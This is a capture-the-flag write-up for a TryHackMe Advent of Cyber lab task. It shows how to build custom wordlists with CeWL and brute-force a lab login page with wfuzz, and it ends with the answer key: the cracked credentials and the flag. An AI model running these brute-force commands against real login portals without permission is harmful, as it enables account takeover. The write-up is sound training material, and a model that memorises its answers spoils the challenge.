# Task 10  [Day 4] Brute-forcing Baby, it's CeWLd outside

---


### Learning Objectives

- What is CeWL?
- What are the capabilities of CeWL?
- How can we leverage CeWL to generate a custom wordlist from a website?
- How can we customise the tool's output for specific tasks?

Once the Machine is go to 

[http://MACHINE_IP/login.php](url)

---

<img width="1305" alt="Screenshot 2023-12-23 at 9 25 30 PM" src="https://github.com/Lynk4/Advent-of-Cyber-2023/assets/44930131/65fefa1f-075f-404b-a64c-5ecd11b0912c">

---

you may install it by using the command 

```
sudo apt-get install cewl -y
```

Create a password list using CeWL: 

```
cewl -d 2 -m 5 -w passwords.txt http://MACHINE_IP --with-numbers
```

Create a username list using CeWL:

```
cewl -d 0 -m 5 -w usernames.txt http://MACHINE_IP/team.php --lowercase
```

Brute-force the login portal using wfuzz: 

```
wfuzz -c -z file,usernames.txt -z file,passwords.txt --hs "Please enter the correct credentials" -u http://MACHINE_IP/login.php -d "username=FUZZ&password=FUZ2Z"
```
---
<img width="937" alt="Screenshot 2023-12-23 at 9 42 50 PM" src="https://github.com/Lynk4/Advent-of-Cyber-2023/assets/44930131/3e6a3b43-48e5-4537-a585-c71152fb4a76">

---

<img width="1304" alt="Screenshot 2023-12-23 at 9 33 13 PM" src="https://github.com/Lynk4/Advent-of-Cyber-2023/assets/44930131/ae6e98f0-8b97-4b33-bc27-65fae5eca89f">

---


Questions:

What is the correct username and password combination? Format username:password

```
isaias:Happiness
```

What is the flag?

```
THM{m3rrY4nt4rct1crAft$}
```
---
